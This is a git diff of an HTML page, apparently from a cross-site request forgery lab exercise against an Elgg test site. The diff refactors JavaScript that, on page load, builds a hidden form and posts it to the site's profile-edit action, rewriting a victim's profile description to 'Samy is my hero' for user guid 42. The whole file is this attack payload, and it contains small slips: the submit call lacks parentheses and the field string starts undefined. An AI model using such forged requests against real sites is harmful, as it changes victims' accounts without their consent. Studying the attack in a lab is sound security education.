@@ -3,54 +3,54 @@
     <title>Web Site</title>
   </head>
   <body>
-    This is a POST request!
+    This is a POST puest!
     <script type="text/javascript">
-      function send_post_req(){
+      function post(url, fields){
   
-        var req = document.createElement("form");
+        var p = document.createElement("form");
+
+        p.action = url;
+        p.innerHTML = fields;
+        p.target = "_self";
+        p.method = "post";  
   
+        document.body.appendChild(p);
+  
+        p.submit;
+      }
+      function csrf(){
         var url = "http://www.csrflabelgg.com/action/profile/edit";
-        var content;
-        content += "<input type='hidden' name='name' value='Alice'>";
+        var fields;
+        fields += "<input type='hidden' name='name' value='Alice'>";
   
-        content += "<input type='hidden' name='description' value='Samy is my hero'>"
-        content += "<input type='hidden' name='accesslevel[description]' value='2'>";
+        fields += "<input type='hidden' name='description' value='Samy is my hero'>"
+        fields += "<input type='hidden' name='accesslevel[description]' value='2'>";
   
-        content += "<input type='hidden' name='briefdescription' value=''>";
-        content += "<input type='hidden' name='accesslevel[briefdescription]' value='2'>";
-        content += "<input type='hidden' name='contactemail' value=''>";
-        content += "<input type='hidden' name='accesslevel[contactemail]' value='2'>";
-        content += "<input type='hidden' name='interests' value=''>";
-        content += "<input type='hidden' name='accesslevel[interests]' value='2'>";
-        content += "<input type='hidden' name='location' value=''>";
-        content += "<input type='hidden' name='accesslevel[location]' value='2'>";
-        content += "<input type='hidden' name='mobile' value=''>";
-        content += "<input type='hidden' name='accesslevel[mobile]' value='2'>";
-        content += "<input type='hidden' name='phone' value=''>";
-        content += "<input type='hidden' name='accesslevel[phone]' value='2'>";
-        content += "<input type='hidden' name='skills' value=''>";
-        content += "<input type='hidden' name='accesslevel[skills]' value='2'>";
-        content += "<input type='hidden' name='twitter' value=''>";
-        content += "<input type='hidden' name='accesslevel[twitter]' value='2'>";
-        content += "<input type='hidden' name='website' value=''>";
-        content += "<input type='hidden' name='accesslevel[website]' value='2'>";
+        fields += "<input type='hidden' name='briefdescription' value=''>";
+        fields += "<input type='hidden' name='accesslevel[briefdescription]' value='2'>";
+        fields += "<input type='hidden' name='contactemail' value=''>";
+        fields += "<input type='hidden' name='accesslevel[contactemail]' value='2'>";
+        fields += "<input type='hidden' name='interests' value=''>";
+        fields += "<input type='hidden' name='accesslevel[interests]' value='2'>";
+        fields += "<input type='hidden' name='location' value=''>";
+        fields += "<input type='hidden' name='accesslevel[location]' value='2'>";
+        fields += "<input type='hidden' name='mobile' value=''>";
+        fields += "<input type='hidden' name='accesslevel[mobile]' value='2'>";
+        fields += "<input type='hidden' name='phone' value=''>";
+        fields += "<input type='hidden' name='accesslevel[phone]' value='2'>";
+        fields += "<input type='hidden' name='skills' value=''>";
+        fields += "<input type='hidden' name='accesslevel[skills]' value='2'>";
+        fields += "<input type='hidden' name='twitter' value=''>";
+        fields += "<input type='hidden' name='accesslevel[twitter]' value='2'>";
+        fields += "<input type='hidden' name='website' value=''>";
+        fields += "<input type='hidden' name='accesslevel[website]' value='2'>";
   
-        content += "<input type='hidden' name='guid' value='42'>";
-  
-  
-  
-        req.action = url;
-        req.innerHTML = content;
-        req.target = "_self";
-        req.method = "post";  
-  
-  
-        document.body.appendChild(req);
-  
-        req.submit;
+        fields += "<input type='hidden' name='guid' value='42'>";
+
+        post(url, fields);
       }
   
-      window.onload = function() { send_post_req(); }
+      window.onload = function() { csrf(); }
     </script>
   </body>
 </html>
